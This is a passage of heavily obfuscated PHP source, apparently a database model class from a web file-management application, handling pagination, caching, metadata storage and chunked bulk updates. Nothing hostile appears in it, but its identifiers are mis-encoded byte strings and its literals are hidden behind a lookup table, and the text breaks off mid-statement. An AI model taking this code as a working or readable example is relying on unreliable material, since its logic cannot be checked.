function _afterSelect(&$¥¥€å›Í, $§Â•×ì) { if (!is_array($¥¥€å›Í)) { return; } if (!$this->checkDataAutoHas($_SERVER[©—Ò»ÅĞ][432])) { return; } foreach ($¥¥€å›Í as &$ãäéĞ¿Ş) { $this->dataAfterFilter($ãäéĞ¿Ş); } unset($ãäéĞ¿Ş); } protected function _afterFind(&$©ö©àÉ¼, $¯„Êˆë½) { if (!is_array($©ö©àÉ¼)) { return; } if (!$this->checkDataAutoHas($_SERVER[©—Ò»ÅĞ][432])) { return; } $this->dataAfterFilter($©ö©àÉ¼); } public static function textEncode($íùì§ëÜ) { if (!$íùì§ëÜ) { return $íùì§ëÜ; } $§…Ô„àõ = json_encode($íùì§ëÜ); $§…Ô„àõ = preg_replace_callback($_SERVER[©—Ò»ÅĞ][433], function ($òñ„şøù) { return addslashes($òñ„şøù[0]); }, $§…Ô„àõ); return json_decode($§…Ô„àõ); } public static function textDecode($«ÒÏ‚ò) { $ıïá´ñæ =& $_SERVER[©—Ò»ÅĞ]; if (!$«ÒÏ‚ò) { return $«ÒÏ‚ò; } $«­¥­¶ = json_encode($«ÒÏ‚ò); $«­¥­¶ = preg_replace_callback($ıïá´ñæ[434], function ($ö¡êÕ«) { return $_SERVER[©—Ò»ÅĞ][97]; }, $«­¥­¶); return json_decode($«­¥­¶); } public function setAutoIncrement($äğ¢åÒ¡) { $ÔáÁû© = array($this->getPk() => $äğ¢åÒ¡); $Õíê³¢• = $this->data($ÔáÁû©)->add(); if ($Õíê³¢•) { $this->delete($Õíê³¢•); } } public function getAutoIncrement() { $ÇÔ’óó™ = $this->getTableName(); $ÊöÃõö = $this->max($this->getPk()); $è½«üóŸ = $this->query("\x73\x68\x6f\x77\40\164\141\142\154\x65\x20\x73\164\141\x74\x75\x73\x20\x77\150\145\162\x65\x20\116\x61\155\x65\x3d\x27{$ÇÔ’óó™}\x27"); $€ä®£¹ = $è½«üóŸ[0][$_SERVER[©—Ò»ÅĞ][435]]; $¿ô¬¾§° = max($ÊöÃõö, $€ä®£¹); return $¿ô¬¾§°; } protected function _callBefore($ÈĞ‚ñ£ï, $û§â’³Å) { return $this->cacheCallCheck($ÈĞ‚ñ£ï, $û§â’³Å, !1); } protected function _callAfter($œõ‘ÎÙ, $ı¡ˆôš÷) { return $this->cacheCallCheck($œõ‘ÎÙ, $ı¡ˆôš÷, !0); } protected function cacheFunctionAlias($ç£àñ‡ù) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($ÚĞ¹„ñ, $¼ö´ÖäÕ, $ŠŠÜÃê” = false) { $“‘Ïù½ñ =& $_SERVER[©—Ò»ÅĞ]; $ê²†óñ = $this->cacheFunctionAlias($¼ö´ÖäÕ); if (!$ê²†óñ) { return; } foreach ($ê²†óñ as $€øº…Š => $Š’¥ä¸Û) { $×Œİ¯±– = $Š’¥ä¸Û[0]; $ºµÀ†¬ = explode($“‘Ïù½ñ[50], $Š’¥ä¸Û[1]); $Ó±ÌÖüî = isset($Š’¥ä¸Û[2]) ? $Š’¥ä¸Û[2] : $“‘Ïù½ñ[12]; if ($ÚĞ¹„ñ == $€øº…Š) { return $this->cacheFunctionGet($€øº…Š, $×Œİ¯±–, $Ó±ÌÖüî); } if ($ŠŠÜÃê” && in_array($ÚĞ¹„ñ, $ºµÀ†¬)) { $this->cacheFunctionClear($€øº…Š, $×Œİ¯±–, $Ó±ÌÖüî); } } } public function cacheFunctionGet($úƒß†ÕÑ, $ŞÑ×¨öÄ, $ìö€åÃû = '') { $Öğ…Ëãó =& $_SERVER[©—Ò»ÅĞ]; $ÚüíùüÉ = $this->cacheKeyMake($úƒß†ÕÑ, $ŞÑ×¨öÄ, $ìö€åÃû); $‰çÂáÁó = Cache::get($ÚüíùüÉ); if (!is_array($‰çÂáÁó)) { if (method_exists($this, $Öğ…Ëãó[341] . $úƒß†ÕÑ)) { $úƒß†ÕÑ = $Öğ…Ëãó[341] . $úƒß†ÕÑ; } $‰çÂáÁó = call_user_func_array(array($this, $úƒß†ÕÑ), array($ŞÑ×¨öÄ, !0)); Cache::set($ÚüíùüÉ, $‰çÂáÁó); } return $‰çÂáÁó; } public function cacheFunctionClear($ˆö¤Ûºõ, $ˆ†¡ÒôÑ, $°äœØ™ = '') { $şÉ¡ÎàÀ = $ˆ†¡ÒôÑ; if (!is_array($ˆ†¡ÒôÑ)) { $şÉ¡ÎàÀ = array($ˆ†¡ÒôÑ); } foreach ($şÉ¡ÎàÀ as $‰…›Í‰) { $Ğ­½‡ç = $this->cacheKeyMake($ˆö¤Ûºõ, $‰…›Í‰, $°äœØ™); Cache::remove($Ğ­½‡ç); } } public function cacheKeyMake($«µâò‰Ë, $÷êÆóÄ†, $ğáÄŞ“É) { $‹½¡§Ä§ =& $_SERVER[©—Ò»ÅĞ]; if ($ğáÄŞ“É) { $÷êÆóÄ† = $÷êÆóÄ† . $‹½¡§Ä§[436] . $ğáÄŞ“É; } return get_class($this) . $‹½¡§Ä§[11] . $«µâò‰Ë . $‹½¡§Ä§[437] . $÷êÆóÄ†; } protected function selectPageReset() { $ù²À²£‰ =& $_SERVER[©—Ò»ÅĞ]; if (isset($GLOBALS[$ù²À²£‰[438]])) { return; } $GLOBALS[$ù²À²£‰[438]] = isset($GLOBALS[$ù²À²£‰[7]][$ù²À²£‰[439]]) ? $GLOBALS[$ù²À²£‰[7]][$ù²À²£‰[439]] : !1; $GLOBALS[$ù²À²£‰[440]] = isset($GLOBALS[$ù²À²£‰[7]][$ù²À²£‰[428]]) ? $GLOBALS[$ù²À²£‰[7]][$ù²À²£‰[428]] : !1; $GLOBALS[$ù²À²£‰[7]][$ù²À²£‰[439]] = !1; $GLOBALS[$ù²À²£‰[7]][$ù²À²£‰[428]] = !1; } protected function selectPageRestore() { $¯°é™ş =& $_SERVER[©—Ò»ÅĞ]; if (!isset($GLOBALS[$¯°é™ş[438]])) { return; } $GLOBALS[$¯°é™ş[7]][$¯°é™ş[439]] = $GLOBALS[$¯°é™ş[438]]; $GLOBALS[$¯°é™ş[7]][$¯°é™ş[428]] = $GLOBALS[$¯°é™ş[440]]; if ($GLOBALS[$¯°é™ş[7]][$¯°é™ş[439]] === !1) { unset($GLOBALS[$¯°é™ş[7]][$¯°é™ş[439]]); } if ($GLOBALS[$¯°é™ş[7]][$¯°é™ş[428]] === !1) { unset($GLOBALS[$¯°é™ş[7]][$¯°é™ş[428]]); } unset($GLOBALS[$¯°é™ş[438]]); unset($GLOBALS[$¯°é™ş[440]]); } protected function selectPage($’¡ÈÔå = 200, $«¥òŸ‰ò = 1) { $²ßÜ¯— =& $_SERVER[©—Ò»ÅĞ]; global $in; $×±¯ƒ« = $this->optionsValue(); $Úşú´¨Ú = 100000; $’¡ÈÔå = isset($in[$²ßÜ¯—[439]]) && $in[$²ßÜ¯—[439]] ? $in[$²ßÜ¯—[439]] : $’¡ÈÔå; if ($’¡ÈÔå === -1) { $in[$²ßÜ¯—[439]] = !1; $Úşú´¨Ú = 100000000; $’¡ÈÔå = $Úşú´¨Ú; } $ûóÅàÔ = $×±¯ƒ«; $ûóÅàÔ[$²ßÜ¯—[441]] = array(); $’¡ÈÔå = intval($’¡ÈÔå); $’¡ÈÔå = $’¡ÈÔå <= 5 ? 5 : ($’¡ÈÔå >= $Úşú´¨Ú ? $Úşú´¨Ú : $’¡ÈÔå); $«¥òŸ‰ò = intval(isset($in[$²ßÜ¯—[428]]) && $in[$²ßÜ¯—[428]] ? $in[$²ßÜ¯—[428]] : $«¥òŸ‰ò); $«¥òŸ‰ò = $«¥òŸ‰ò <= 1 ? 1 : $«¥òŸ‰ò; $ŒÉ½—« = array(); $º¸å€¸¸ = 1; $¯»§¾Á» = $this->selectPageCountBy(); if ($«¥òŸ‰ò == 1 && $º¸å€¸¸) { $this->optionsValue($×±¯ƒ«); $ŒÉ½—« = $this->page($«¥òŸ‰ò, $’¡ÈÔå)->select(); $¢Şßâ¸û = is_array($ŒÉ½—«) ? count($ŒÉ½—«) : 0; if ($¢Şßâ¸û < $’¡ÈÔå) { $Ş‰·šåØ = 1; } else { $this->optionsValue($ûóÅàÔ); $¢Şßâ¸û = intval($this->count($¯»§¾Á»)); $Ş‰·šåØ = ceil($¢Şßâ¸û / $’¡ÈÔå); } } else { $this->optionsValue($ûóÅàÔ); $¢Şßâ¸û = intval($this->count($¯»§¾Á»)); $Ş‰·šåØ = ceil($¢Şßâ¸û / $’¡ÈÔå); $«¥òŸ‰ò = $«¥òŸ‰ò >= $Ş‰·šåØ ? $Ş‰·šåØ : $«¥òŸ‰ò; $this->optionsValue($×±¯ƒ«); $ŒÉ½—« = $this->page($«¥òŸ‰ò, $’¡ÈÔå)->select(); } $this->selectPageCountBy($²ßÜ¯—[442]); if (!is_array($ŒÉ½—«)) { $ŒÉ½—« = array(); } if ($Ş‰·šåØ == 1) { $¢Şßâ¸û = count($ŒÉ½—«); } $ÙÊŒçíˆ = array($²ßÜ¯—[443] => array($²ßÜ¯—[444] => $¢Şßâ¸û, $²ßÜ¯—[439] => $’¡ÈÔå, $²ßÜ¯—[428] => $«¥òŸ‰ò, $²ßÜ¯—[445] => $Ş‰·šåØ), $²ßÜ¯—[446] => $ŒÉ½—«); return $ÙÊŒçíˆ; } protected function selectPageCountBy($ÅÜÚè”± = false) { static $´ïÑ›Âû = null; if (!$ÅÜÚè”±) { return $´ïÑ›Âû; } if ($ÅÜÚè”± == $_SERVER[©—Ò»ÅĞ][442]) { $´ïÑ›Âû = null; return; } $´ïÑ›Âû = $ÅÜÚè”±; } protected function checkLength($¸¦æ¨¿, $å”ü¾Ï• = 0, $¿ÒÎ´ç = '') { $³„ïá×‹ =& $_SERVER[©—Ò»ÅĞ]; $å”ü¾Ï• = $å”ü¾Ï• ? $å”ü¾Ï• : 65536; if (!$¸¦æ¨¿ || strlen($¸¦æ¨¿) < $å”ü¾Ï•) { return; } $¿ÒÎ´ç = $¿ÒÎ´ç ? $¿ÒÎ´ç . $³„ïá×‹[74] : $³„ïá×‹[12]; show_json($¿ÒÎ´ç . LNG($³„ïá×‹[447]) . "\x28{$å”ü¾Ï•}\51", !1); } protected function metaSet($ÍÚöÒ‹‡, $®—¼ô ¼ = null, $‘Œàñ½Ş = null) { $®è¬†ã¢ =& $_SERVER[©—Ò»ÅĞ]; if (!$this->tableMeta || !$ÍÚöÒ‹‡) { return !1; } $™ ØÉÙş = $this->tableMeta[$®è¬†ã¢[448]]; $«İ÷ºí¬ = $this->tableMeta[$®è¬†ã¢[449]]; $§Ã¹õªƒ = Model($«İ÷ºí¬); $ÖĞ’¥‡ = array($™ ØÉÙş => $ÍÚöÒ‹‡, $®è¬†ã¢[450] => $®—¼ô ¼); if (is_null($®—¼ô ¼)) { return $§Ã¹õªƒ->where(array($™ ØÉÙş => $ÍÚöÒ‹‡))->delete(); } if (is_null($‘Œàñ½Ş) && is_string($®—¼ô ¼)) { return $§Ã¹õªƒ->where($ÖĞ’¥‡)->delete(); } $¦ËŒ„ª’ = is_array($®—¼ô ¼) ? $®—¼ô ¼ : array(); if (is_string($®—¼ô ¼)) { $¦ËŒ„ª’[$®—¼ô ¼] = $‘Œàñ½Ş; } $œªËòŒà = array(); foreach ($¦ËŒ„ª’ as $ÎøÜÛßº => $ç™ê©çı) { if (is_null($ç™ê©çı) && is_string($ÎøÜÛßº)) { $§Ã¹õªƒ->where(array($™ ØÉÙş => $ÍÚöÒ‹‡, $®è¬†ã¢[450] => $ÎøÜÛßº))->delete(); continue; } $this->checkLength($ç™ê©çı, !1, $«İ÷ºí¬ . $®è¬†ã¢[4] . $ÎøÜÛßº); $œªËòŒà[] = array($™ ØÉÙş => $ÍÚöÒ‹‡, $®è¬†ã¢[95] => $ÎøÜÛßº, $®è¬†ã¢[451] => $ç™ê©çı); } $ŒŸ¤¿ù‚ = $®è¬†ã¢[452] . $«İ÷ºí¬; CacheLock::lock($ŒŸ¤¿ù‚); $§Ã¹õªƒ->where(array($™ ØÉÙş => $ÍÚöÒ‹‡))->addAll($œªËòŒà, array(), !0); CacheLock::unlock($ŒŸ¤¿ù‚); return !0; } public function metaGet($ÆÌ·êÔ·, $£¥¥ÓŒ¾ = false) { $ª³¨ö =& $_SERVER[©—Ò»ÅĞ]; if (!$this->tableMeta) { return array(); } $÷œÁõ³ö = $this->tableMeta[$ª³¨ö[448]]; $……’¡áù = Model($this->tableMeta[$ª³¨ö[449]]); if ($£¥¥ÓŒ¾) { $•äú¦ıÏ = array($÷œÁõ³ö => $ÆÌ·êÔ·, $ª³¨ö[95] => $£¥¥ÓŒ¾); return $……’¡áù->where($•äú¦ıÏ)->getField($ª³¨ö[451]); } $•äú¦ıÏ = array($÷œÁõ³ö => $ÆÌ·êÔ·); $ø££ÎÅÜ = $……’¡áù->field($ª³¨ö[453])->where($•äú¦ıÏ)->select(); $ø££ÎÅÜ = array_to_keyvalue($ø££ÎÅÜ, $ª³¨ö[95], $ª³¨ö[451]); return $ø££ÎÅÜ; } private function checkDataAutoHas($¶ ¯îÚ) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $ë¨«Î©Å) { if (in_array($¶ ¯îÚ, explode($_SERVER[©—Ò»ÅĞ][50], $ë¨«Î©Å[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$œ¿–Ãı±, $‰±øà©) { $œŒŒ©Ó“ =& $_SERVER[©—Ò»ÅĞ]; if (!is_array($œ¿–Ãı±)) { return; } foreach ($this->dataAuto as $¤­‰Ş»Ë) { $âŸ”¬¬İ = $¤­‰Ş»Ë[0]; if (!in_array($‰±øà©, explode($œŒŒ©Ó“[50], $¤­‰Ş»Ë[2]))) { continue; } switch (trim($¤­‰Ş»Ë[3])) { case $œŒŒ©Ó“[396]: case $œŒŒ©Ó“[397]: $ä¬¹ı‘ñ = $¤­‰Ş»Ë[1]; $ÊÍñé©ñ = isset($¤­‰Ş»Ë[4]) ? (array) $¤­‰Ş»Ë[4] : array(); if ($ä¬¹ı‘ñ == $œŒŒ©Ó“[204] && array_key_exists($âŸ”¬¬İ, $œ¿–Ãı±)) { if (!$œ¿–Ãı±[$âŸ”¬¬İ]) { unset($œ¿–Ãı±[$âŸ”¬¬İ]); } break; } if (isset($œ¿–Ãı±[$âŸ”¬¬İ])) { array_unshift($ÊÍñé©ñ, $œ¿–Ãı±[$âŸ”¬¬İ]); } if ($œŒŒ©Ó“[396] == $¤­‰Ş»Ë[3]) { $œ¿–Ãı±[$âŸ”¬¬İ] = call_user_func_array($ä¬¹ı‘ñ, $ÊÍñé©ñ); } else { $œ¿–Ãı±[$âŸ”¬¬İ] = call_user_func_array(array(&$this, $ä¬¹ı‘ñ), $ÊÍñé©ñ); } break; case $œŒŒ©Ó“[348]: if (isset($œ¿–Ãı±[$âŸ”¬¬İ]) && $œ¿–Ãı±[$âŸ”¬¬İ]) { $œ¿–Ãı±[$âŸ”¬¬İ] = call_user_func_array(array(&$this, $¤­‰Ş»Ë[1]), array($œ¿–Ãı±[$âŸ”¬¬İ])); } break; case $œŒŒ©Ó“[351]: $œ¿–Ãı±[$âŸ”¬¬İ] = $œ¿–Ãı±[$¤­‰Ş»Ë[1]]; break; case $œŒŒ©Ó“[369]: if (isset($œ¿–Ãı±[$âŸ”¬¬İ]) && !is_string($œ¿–Ãı±[$âŸ”¬¬İ])) { $œ¿–Ãı±[$âŸ”¬¬İ] = json_encode_force($œ¿–Ãı±[$âŸ”¬¬İ]); $œ¿–Ãı±[$âŸ”¬¬İ] = self::textEncode($œ¿–Ãı±[$âŸ”¬¬İ]); } break; case $œŒŒ©Ó“[398]: if ($œ¿–Ãı±[$âŸ”¬¬İ] === $œŒŒ©Ó“[12]) { unset($œ¿–Ãı±[$âŸ”¬¬İ]); } break; case $œŒŒ©Ó“[399]: $œ¿–Ãı±[$âŸ”¬¬İ] = $¤­‰Ş»Ë[1]; default: break; } } if ($‰±øà© == $œŒŒ©Ó“[430]) { $‰“áãÉ‹ = strtolower($this->db->getDbType()); if (strpos($‰“áãÉ‹, $œŒŒ©Ó“[13]) !== 0) { return; } $À–˜µ = $this->field(!0)->fields; $—Ê´¯Ç = $À–˜µ[$œŒŒ©Ó“[329]]; if (isset($À–˜µ[$œŒŒ©Ó“[328]])) { unset($—Ê´¯Ç[$À–˜µ[$œŒŒ©Ó“[328]]]); } foreach ($—Ê´¯Ç as $»‚Ê’€û => $‰±øà©) { if (!isset($œ¿–Ãı±[$»‚Ê’€û])) { $œ¿–Ãı±[$»‚Ê’€û] = $œŒŒ©Ó“[12]; } } } } private function dataAfterFilter(&$†ìÇ–óÄ) { $¶ŸÄÏõ£ =& $_SERVER[©—Ò»ÅĞ]; foreach ($this->dataAuto as $ØŞ‚ÕÍ¡) { $µµ‚º‚¯ = $ØŞ‚ÕÍ¡[0]; if (!isset($†ìÇ–óÄ[$µµ‚º‚¯])) { continue; } if (!in_array($¶ŸÄÏõ£[432], explode($¶ŸÄÏõ£[50], $ØŞ‚ÕÍ¡[2]))) { continue; } switch (trim($ØŞ‚ÕÍ¡[3])) { case $¶ŸÄÏõ£[396]: case $¶ŸÄÏõ£[397]: $‰œÀì´Ä = isset($ØŞ‚ÕÍ¡[4]) ? (array) $ØŞ‚ÕÍ¡[4] : array(); array_unshift($‰œÀì´Ä, $†ìÇ–óÄ[$µµ‚º‚¯]); if (isset($ØŞ‚ÕÍ¡[4]) && $ØŞ‚ÕÍ¡[4] == $¶ŸÄÏõ£[454]) { $‰œÀì´Ä = array($†ìÇ–óÄ[$µµ‚º‚¯]); } if ($¶ŸÄÏõ£[396] == $ØŞ‚ÕÍ¡[3]) { $†ìÇ–óÄ[$µµ‚º‚¯] = call_user_func_array($ØŞ‚ÕÍ¡[1], $‰œÀì´Ä); } else { $†ìÇ–óÄ[$µµ‚º‚¯] = call_user_func_array(array(&$this, $ØŞ‚ÕÍ¡[1]), $‰œÀì´Ä); } break; case $¶ŸÄÏõ£[348]: if (isset($†ìÇ–óÄ[$µµ‚º‚¯]) && $†ìÇ–óÄ[$µµ‚º‚¯]) { $†ìÇ–óÄ[$µµ‚º‚¯] = call_user_func_array(array(&$this, $ØŞ‚ÕÍ¡[1]), array($†ìÇ–óÄ[$µµ‚º‚¯])); } break; case $¶ŸÄÏõ£[351]: $†ìÇ–óÄ[$µµ‚º‚¯] = $†ìÇ–óÄ[$ØŞ‚ÕÍ¡[1]]; break; case $¶ŸÄÏõ£[369]: $„Òè™Îé = $†ìÇ–óÄ[$µµ‚º‚¯]; $„Òè™Îé = self::textDecode($„Òè™Îé); $†ìÇ–óÄ[$µµ‚º‚¯] = json_decode($„Òè™Îé, !0); if (is_null($†ìÇ–óÄ[$µµ‚º‚¯])) { $†ìÇ–óÄ[$µµ‚º‚¯] = $„Òè™Îé; } break; case $¶ŸÄÏõ£[398]: if ($†ìÇ–óÄ[$µµ‚º‚¯] === $¶ŸÄÏõ£[12]) { unset($†ìÇ–óÄ[$µµ‚º‚¯]); } break; case $¶ŸÄÏõ£[399]: $†ìÇ–óÄ[$µµ‚º‚¯] = $ØŞ‚ÕÍ¡[1]; break; default: break; } } } public function saveAll($ï¶ç†±š, $§Æâ––ù = false) { $Ã¸Çã¨° =& $_SERVER[©—Ò»ÅĞ]; $Ü—¯¤Ï— = $this->db; $Õë¼³Ö = $this->tablePrefix . $this->tableName; $Ô‹Óº¸ = $this->saveAllChunkMake($ï¶ç†±š); $§Æâ––ù = is_array($§Æâ––ù) ? $§Æâ––ù : array(); foreach ($Ô‹Óº¸ as $óÌÓğ…È) { $şÜªÁ´ = $Ã¸Çã¨°[12]; $ËôúáôŸ = $Ã¸Çã¨°[12]; $Èøáµ¡› = array(); $ò‹æ¥Ê = array(); foreach ($óÌÓğ…È as $úùîÉî => $Àçæ±›) { $şÜªÁ´ = $Àçæ±›[$Ã¸Çã¨°[455]]; $ò‹æ¥Ê[] = $Àçæ±›[$Ã¸Çã¨°[456]]; $€—¹³•À = $Ü—¯¤Ï—->parseValue($Àçæ±›[$Ã¸Çã¨°[456]]); foreach ($Àçæ±›[$Ã¸Çã¨°[457]] as $€ÑÛÜ« => $Êçš º) { if (!$Èøáµ¡›[$€ÑÛÜ«]) { $Èøáµ¡›[$€ÑÛÜ«] = array(); } $Èøáµ¡›[$€ÑÛÜ«][] = $Ã¸Çã¨°[458] . $€—¹³•À . $Ã¸Çã¨°[459] . $Ü—¯¤Ï—->parseValue($Êçš º); } } $ş¢¿å§¥ = $şÜªÁ´; $ş¢¿å§¥ = $Ü—¯¤Ï—->parseKey($ş¢¿å§¥); foreach ($Èøáµ¡› as $€ÑÛÜ« => $î¢éÒ¡Û) { $ËôúáôŸ .= $Ã¸Çã¨°[285] . $Ü—¯¤Ï—->parseKey($€ÑÛÜ«) . $Ã¸Çã¨°[460] . $ş¢¿å§¥ . $Ã¸Çã¨°[461]; $ËôúáôŸ .= implode($Ã¸Çã¨°[285], $î¢éÒ¡Û) . $Ã¸Çã¨°[462]; } $±ı´ø‰  = $§Æâ––ù; $±ı´ø‰ [$şÜªÁ´] = array($Ã¸Çã¨°[7], $ò‹æ¥Ê); $ªÍ‰ù¼ü = "\125\x50\x44\x41\x54\x45\40\140{$Õë¼³Ö}\x60\40\123\x45\x54\x20" . rtrim($ËôúáôŸ, $Ã¸Çã¨°[50]) . $Ã¸Çã¨°[285] . $Ü—¯¤Ï—->parseWhere($±ı´ø‰ ); $this->execute($ªÍ‰ù¼ü); $this->chunkEventCheck(count($óÌÓğ…È)); } $this->chunkEventSet(); } public function saveAllEach($ßÅª ‡‰, $»÷œ¸ = false) { $Åüœş€· =& $_SERVER[©—Ò»ÅĞ]; $Ã´âŠãé = $this->db; $Òñ…‰ñ = $this->tablePrefix . $this->tableName; $ëÎïçÂ = $this->saveAllChunkMake($ßÅª ‡‰); $»÷œ¸ = is_array($»÷œ¸) ? $»÷œ¸ : array(); foreach ($ëÎïçÂ as $ê„Æòœ) { foreach ($ê„Æòœ as $×¨Ëˆñ“ => $Å¥³óÆ) { $Ëâ¯Æœ÷ = $Åüœş€·[463]; foreach ($Å¥³óÆ[$Åüœş€·[457]] as $¢š«ŒºÚ => $Øô¼‰–í) { $Ëâ¯Æœ÷ .= $Ã´âŠãé->parseKey($¢š«ŒºÚ) . $Åüœş€·[464] . $Ã´âŠãé->parseValue($Øô¼‰–í) . $Åüœş€·[50]; } $²ú¾´™Í = $»÷œ¸; $²ú¾´™Í[$Å¥³óÆ[$Åüœş€·[455]]] = $Å¥³óÆ[$Åüœş€·[456]]; $€Œ¡œ‘ = "\125\x50\x44\x41\x54\105\x20\x60{$Òñ…‰ñ}\140\40\x53\105\124\40" . rtrim($Ëâ¯Æœ÷, $Åüœş€·[50]) . $Åüœş€·[465] . $Ã´âŠãé->parseWhere($²ú¾´™Í) . $Åüœş€·[466]; $this->execute($€Œ¡œ‘); } $this->chunkEventCheck(count($ê„Æòœ)); } $this->chunkEventSet(); } private function saveAllChunkMake($ÑÚ‰“Œ·) { $Öı¢á  =& $_SERVER[©—Ò»ÅĞ]; $èô’¯ê· = self::SQL_WHERE_IN_CHUNK; $ÑÚ‰“Œ· = is_array($ÑÚ‰“Œ·) ? $ÑÚ‰“Œ· : array(); $ø©Şê¸Š = array(); $ü§´ûéÑ = ceil(count($ÑÚ‰“Œ·) / $èô’¯ê·); for ($òşê€“ü = 0; $òşê€“ü < $ü§´ûéÑ; $òşê€“ü++) { $ı¼ËÒ”í = array(); $óŠïæ³÷ = array_slice($ÑÚ‰“Œ·, $òşê€“ü * $èô’¯ê·, $èô’¯ê·); foreach ($óŠïæ³÷ as $•¯ê¯±ü) { if (!is_array($•¯ê¯±ü) || count($•¯ê¯±ü) < 4 || count($•¯ê¯±ü) % 2 != 0) { continue; } $£€ÏÑş = array(); for ($ñ¯±öÕä = 2; $ñ¯±öÕä < count($•¯ê¯±ü); $ñ¯±öÕä += 2) { $£€ÏÑş[$•¯ê¯±ü[$ñ¯±öÕä]] = $•¯ê¯±ü[$ñ¯±öÕä + 1]; } $ı¼ËÒ”í[] = array($Öı¢á [455] => $•¯ê¯±ü[0], $Öı¢á [456] => $•¯ê¯±ü[1], $Öı¢á [457] => $£€ÏÑş); } $ø©Şê¸Š[] = $ı¼ËÒ”í; } return $ø©Şê¸Š; } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($İêÑ¨ = false, $½â•µ¶Î = false) { $this->_chunkEvent = $İêÑ¨; $this->_chunkEventParam = $½â•µ¶Î; } private function chunkEventCheck($óµ²Ö¤®) { if (!$this->_chunkEvent) { return; } $î¾ åì½ = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $î¾ åì½[$_SERVER[©—Ò»ÅĞ][467]] = $óµ²Ö¤®; Hook::trigger($this->_chunkEvent, $î¾ åì½); } public function addAll($ˆ‰½ğÎÔ, $• œÑ€® = array(), $ÒÔç¸›‰ = false) { $ä¨µÀ«¥ =& $_SERVER[©—Ò»ÅĞ]; ignore_timeout(); $ ÌİŠ¿ = self::SQL_WHERE_IN_CHUNK; if (empty($ˆ‰½ğÎÔ)) { $this->error = think_lang($ä¨µÀ«¥[349]); return !1; } $• œÑ€® = $this->_parseOptions($• œÑ€®); foreach ($ˆ‰½ğÎÔ as $¶Ï‹ØÂù => $ã–†¦Î˜) { $ˆ‰½ğÎÔ[$¶Ï‹ØÂù] = $this->_facade($ã–†¦Î˜); $this->_beforeInsert($ˆ‰½ğÎÔ[$¶Ï‹ØÂù], $• œÑ€®); } if (method_exists($this->db, $ä¨µÀ«¥[350])) { for ($Ù‘’Ïİä = 0; $Ù‘’Ïİä < count($ˆ‰½ğÎÔ); $Ù‘’Ïİä += $ ÌİŠ¿) { $¡¾¢†„Ü = array_slice($ˆ‰½ğÎÔ, $Ù‘’Ïİä, $ ÌİŠ¿); if (!is_array($¡¾¢†„Ü) || count($¡¾¢†„Ü) == 0) { break; } $¤¦¤¯ï¦ = $this->db->insertAll($¡¾¢†„Ü, $• œÑ€®, $ÒÔç¸›‰); $this->chunkEventCheck(count($¡¾¢†„Ü)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($ˆ‰½ğÎÔ as $¶Ï‹ØÂù => $ã–†¦Î˜) { $¤¦¤¯ï¦ = $this->db->insert($ã–†¦Î˜, $• œÑ€®, $ÒÔç¸›‰); } $this->commit(); } if (!1 !== $¤¦¤¯ï¦) { $×ñÇç—ì = $this->getLastInsID(); if ($×ñÇç—ì) { return $×ñÇç—ì; } } return $¤¦¤¯ï¦; } public function save($Ø‘çÉ¦ = '', $™ï¡ÁÀĞ = array()) { $Óä¦™© =& $_SERVER[©—Ò»ÅĞ]; $ÅÏšõ‰” = self::SQL_WHERE_IN_CHUNK; $”±ÜÑøŞ = $this->optionsValue(); $ˆô¶Ùå = $this->findWhereField($”±ÜÑøŞ); if (!$ˆô¶Ùå) { return parent::save($Ø‘çÉ¦, $™ï¡ÁÀĞ); } $¯îíôÊ = 0; $Ãş§É© = $”±ÜÑøŞ[$Óä¦™©[353]][$ˆô¶Ùå][1]; $Ãş§É© = is_array($Ãş§É©) ? $Ãş§É© : array(); $áÊÀ«Ç = count($Ãş§É©); for ($…«µİÖÜ = 0; $…«µİÖÜ < $áÊÀ«Ç; $…«µİÖÜ += $ÅÏšõ‰”) { $”–¸ÄÉÒ = array_slice($Ãş§É©, $…«µİÖÜ, $ÅÏšõ‰”); if (!is_array($”–¸ÄÉÒ) || count($”–¸ÄÉÒ) == 0) { break; } $”±ÜÑøŞ[$Óä¦™©[353]][$ˆô¶Ùå][1] = $”–¸ÄÉÒ; $this->optionsValue($”±ÜÑøŞ); $¯îíôÊ += parent::save($Ø‘çÉ¦, $™ï¡ÁÀĞ); $this->chunkEventCheck(count($”–¸ÄÉÒ)); } $this->chunkEventSet(); return $¯îíôÊ; } public function add($ÓÄøŞÂƒ = '', $¯—ï—Ã = array(), $“Šñ×Çû = false) { if ($this->addTaskStatus && is_array($ÓÄøŞÂƒ)) { $this->addTaskData[] = $ÓÄøŞÂƒ; return; } return parent::add($ÓÄøŞÂƒ, $¯—ï—Ã, $“Šñ×Çû); } public function parseWhereLike($®×Â±¬, $Û”½Ó Ø = '', $¼¡Ä§ç® = false, &$ˆâ¹üüó = false) { $ÎæÚüÏÄ =& $_SERVER[©—Ò»ÅĞ]; $œäš¼Ïò = $GLOBALS[$ÎæÚüÏÄ[6]][$ÎæÚüÏÄ[468]]; if (!$œäš¼Ïò[$ÎæÚüÏÄ[469]]) { return $®×Â±¬; } if (!in_array($this->tableName, array($ÎæÚüÏÄ[429], $ÎæÚüÏÄ[470], $ÎæÚüÏÄ[471], $ÎæÚüÏÄ[472]))) { return $®×Â±¬; } if (!is_array($®×Â±¬)) { return $®×Â±¬; } $‚ÉŠëş¦ = array(); $äˆ“Ûº¸ = 0; foreach ($®×Â±¬ as $ÏíèÀíİ => $¬Û”“») { if (is_array($¬Û”“») && count($¬Û”“») == 2 && $¬Û”“»[0] == $ÎæÚüÏÄ[473] && is_string($¬Û”“»[1]) && substr($¬Û”“»[1], 0, 1) == $ÎæÚüÏÄ[474] && substr($¬Û”“»[1], strlen($¬Û”“»[1]) - 1, 1) == $ÎæÚüÏÄ[474]) { $ˆâ¹üüó = !0; $Š¬¹É¦ = is_string($ÏíèÀíİ) ? $ÏíèÀíİ : $Û”½Ó Ø; $°åÄ±æ“ = substr($¬Û”“»[1], 1, strlen($¬Û”“»[1]) - 2); $°åÄ±æ“ = $this->db->escapeString($°åÄ±æ“); if (!strpos($Š¬¹É¦, $ÎæÚüÏÄ[10])) { $Š¬¹É¦ = $ÎæÚüÏÄ[475] . $Š¬¹É¦ . $ÎæÚüÏÄ[475]; } $„¼§™€ = $ÎæÚüÏÄ[220] . 